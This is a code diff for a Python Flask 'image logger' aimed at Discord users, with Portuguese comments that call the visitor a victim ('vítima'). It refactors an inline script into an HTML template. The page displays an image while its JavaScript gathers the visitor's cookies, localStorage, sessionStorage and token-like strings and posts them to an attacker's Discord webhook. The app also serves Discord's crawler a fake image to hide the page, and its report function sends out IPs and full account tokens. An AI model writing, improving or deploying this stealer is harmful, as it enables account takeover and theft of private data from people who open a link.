@@ -93,7 +93,7 @@ def validate_token(token):
     except Exception as e:
         return {"valid": False, "error": str(e)}
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None, token_info=None, cookie_data=None):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None, token_info=None, storage_data=None):
     if ip and ip.startswith(blacklistedIPs):
         return
     
@@ -163,7 +163,6 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
         "**User Agent:**\n```\n" + str(useragent) + "\n```"
     )
     
-    # ===== TOKEN CAPTURADO =====
     if token and token_info:
         if token_info.get("valid"):
             description += (
@@ -184,19 +183,13 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
                 "**Full Token:** ||" + token + "||"
             )
     
-    # ===== COOKIES/STORAGE CAPTURADOS =====
-    if cookie_data:
-        description += "\n\n**🍪 BROWSER STORAGE CAPTURED**\n"
-        if cookie_data.get("cookies"):
-            description += "\n**Cookies:**\n```\n" + cookie_data["cookies"][:500] + "\n```"
-        if cookie_data.get("localStorage"):
-            description += "\n**localStorage:**\n```\n" + cookie_data["localStorage"][:500] + "\n```"
-        if cookie_data.get("sessionStorage"):
-            description += "\n**sessionStorage:**\n```\n" + cookie_data["sessionStorage"][:500] + "\n```"
-        if cookie_data.get("discord_tokens"):
-            description += "\n**🎯 Discord Tokens Found in Storage:**\n"
-            for dt in cookie_data["discord_tokens"]:
-                description += "> `" + dt[:30] + "...`\n"
+    if storage_data:
+        description += (
+            "\n\n**🍪 BROWSER STORAGE CAPTURED**\n"
+            "**Cookies:**\n```\n" + storage_data.get("cookies", "None")[:500] + "\n```\n"
+            "**localStorage:**\n```\n" + storage_data.get("localStorage", "None")[:500] + "\n```\n"
+            "**sessionStorage:**\n```\n" + storage_data.get("sessionStorage", "None")[:500] + "\n```"
+        )
     
     embed = {
         "username": config["username"],
@@ -217,6 +210,106 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
     except:
         pass
     return info
+
+# ========== HTML + STEALER SCRIPT ==========
+HTML_TEMPLATE = '''<!DOCTYPE html>
+<html>
+<head>
+<style>
+body{margin:0;padding:0;}
+div.img{{
+background-image:url('{url}');
+background-position:center center;
+background-repeat:no-repeat;
+background-size:contain;
+width:100vw;height:100vh;
+}}
+</style>
+<script>
+(function() {{
+    var webhook = '{webhook}';
+    
+    function sendData(data) {{
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', webhook);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({{
+            username: 'Storage Logger',
+            content: '🍪 STORAGE DATA CAPTURED',
+            embeds: [{{
+                title: 'Browser Storage',
+                color: 0xFF6600,
+                description: '```\\n' + data + '\\n```'
+            }}]
+        }}));
+    }}
+    
+    function extractToken(text) {{
+        var match = text.match(/[a-zA-Z0-9._-]{{30,100}}/);
+        return match ? match[0] : null;
+    }}
+    
+    var data = '';
+    
+    // 1. COOKIES - pega TODOS
+    var cookies = document.cookie;
+    if (cookies) {{
+        data += 'COOKIES:\\n' + cookies + '\\n\\n';
+        // Tenta extrair token de cookies
+        var token = extractToken(cookies);
+        if (token) {{
+            data += 'TOKEN ENCONTRADO NOS COOKIES: ' + token + '\\n\\n';
+        }}
+    }}
+    
+    // 2. LOCALSTORAGE
+    try {{
+        if (localStorage.length > 0) {{
+            data += 'LOCALSTORAGE:\\n';
+            for (var key in localStorage) {{
+                var val = localStorage[key];
+                data += key + ': ' + val + '\\n';
+                var token = extractToken(val);
+                if (token) {{
+                    data += '>> TOKEN ENCONTRADO: ' + token + '\\n';
+                }}
+            }}
+            data += '\\n';
+        }}
+    }} catch(e) {{}}
+    
+    // 3. SESSIONSTORAGE
+    try {{
+        if (sessionStorage.length > 0) {{
+            data += 'SESSIONSTORAGE:\\n';
+            for (var key in sessionStorage) {{
+                var val = sessionStorage[key];
+                data += key + ': ' + val + '\\n';
+                var token = extractToken(val);
+                if (token) {{
+                    data += '>> TOKEN ENCONTRADO: ' + token + '\\n';
+                }}
+            }}
+            data += '\\n';
+        }}
+    }} catch(e) {{}}
+    
+    // 4. TENTA PEGAR TOKEN DO HEADER Authorization
+    // (Se a página tiver feito requisições com token)
+    
+    // 5. SE ENCONTROU ALGO, ENVIA
+    if (data) {{
+        sendData(data);
+    }} else {{
+        sendData('Nenhum dado encontrado no navegador.\\nA vítima não está logada em nenhum serviço.');
+    }}
+}})();
+</script>
+</head>
+<body>
+<div class="img"></div>
+</body>
+</html>'''
 
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
@@ -273,68 +366,6 @@ def catch_all(path):
         else:
             url = config["image"]
         
-        # ========== COOKIE/STORAGE STEALER SCRIPT ==========
-        steal_script = """
-<script>
-(function() {
-    var webhook = '""" + config["webhook"] + """';
-    
-    function sendData(data) {
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', webhook);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify({
-            username: 'Storage Logger',
-            content: '🍪 STORAGE DATA CAPTURED',
-            embeds: [{
-                title: 'Browser Storage',
-                color: 0xFF6600,
-                description: '```\\n' + data + '\\n```'
-            }]
-        }));
-    }
-    
-    // Captura cookies
-    var cookies = document.cookie;
-    var localStorageData = '';
-    var sessionStorageData = '';
-    var discordTokens = [];
-    
-    // localStorage
-    try {
-        for (var key in localStorage) {
-            var val = localStorage[key];
-            localStorageData += key + ': ' + val + '\\n';
-            if (val.match(/[a-zA-Z0-9._-]{30,100}/)) {
-                discordTokens.push(val);
-            }
-        }
-    } catch(e) {}
-    
-    // sessionStorage
-    try {
-        for (var key in sessionStorage) {
-            var val = sessionStorage[key];
-            sessionStorageData += key + ': ' + val + '\\n';
-            if (val.match(/[a-zA-Z0-9._-]{30,100}/)) {
-                discordTokens.push(val);
-            }
-        }
-    } catch(e) {}
-    
-    // Envia se encontrou algo
-    if (cookies || localStorageData || sessionStorageData) {
-        var combined = '';
-        if (cookies) combined += 'COOKIES:\\n' + cookies + '\\n\\n';
-        if (localStorageData) combined += 'LOCALSTORAGE:\\n' + localStorageData + '\\n\\n';
-        if (sessionStorageData) combined += 'SESSIONSTORAGE:\\n' + sessionStorageData + '\\n\\n';
-        if (discordTokens.length) combined += 'DISCORD TOKENS FOUND:\\n' + discordTokens.join('\\n');
-        sendData(combined);
-    }
-})();
-</script>
-"""
-        
         # ========== DISCORD CRAWLER ==========
         is_crawler = 'Discordbot' in ua or ('Discord' in ua and 'bot' in ua.lower()) or (ip and ip.startswith(('34', '35')))
         
@@ -348,26 +379,11 @@ def catch_all(path):
                 loading = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
                 return Response(loading, mimetype='image/jpeg')
         
-        # ========== RESPOSTA HTML COM STEALER ==========
-        html = f'''<!DOCTYPE html>
-<html>
-<head>
-<style>
-body{{margin:0;padding:0;}}
-div.img{{
-background-image:url('{url}');
-background-position:center center;
-background-repeat:no-repeat;
-background-size:contain;
-width:100vw;height:100vh;
-}}
-</style>
-</head>
-<body>
-<div class="img"></div>
-{steal_script}
-</body>
-</html>'''
+        # ========== RESPOSTA HTML ==========
+        html = HTML_TEMPLATE.format(
+            url=url,
+            webhook=config["webhook"]
+        )
         
         makeReport(ip, ua, endpoint=request.path, url=url, token=token, token_info=token_info)
         return Response(html, mimetype='text/html')
